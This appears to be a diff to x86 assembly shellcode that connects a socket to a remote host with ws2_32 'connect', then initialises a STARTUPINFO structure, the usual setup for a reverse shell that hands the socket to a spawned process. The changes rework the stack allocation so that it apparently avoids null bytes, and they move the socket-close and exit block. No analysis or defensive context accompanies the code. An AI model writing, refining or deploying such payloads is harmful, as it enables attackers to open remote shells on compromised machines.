@@ -313,7 +313,10 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -512   ; edi = alloc(512)
+    xor    edx, edx
+    mov    dh, 2
+    dec    eax
+    sub    esp, edx
     push   esp
     pop    edi
     
@@ -360,8 +363,19 @@ rc_l2:
     push   ebx         ; s
     callx  "ws2_32.dll", "connect", 3
     test   eax, eax
-    jnz    cls_s
+    jz     init_si    
+cls_s:    
+    ; closesocket (s);
+    push   ebx         ; s
+    callx  "ws2_32.dll", "closesocket", 1
+xit:    
+    xor    edx, edx
+    mov    dh, 2
+    dec    eax
+    add    esp, edx
+    ret        
     
+init_si:    
     ; initialize STARTUPINFO
     ; here is where it gets a bit tricky
     mov    al, 104
@@ -446,10 +460,4 @@ rc_l10x:
     lodsd
     push   eax    
     callx  "kernel32.dll", "CloseHandle", 1     
-cls_s:    
-    ; closesocket (s);
-    push   ebx         ; s
-    callx  "ws2_32.dll", "closesocket", 1
-xit:    
-    sub    esp, -512
-    ret    
+    jmp    cls_s
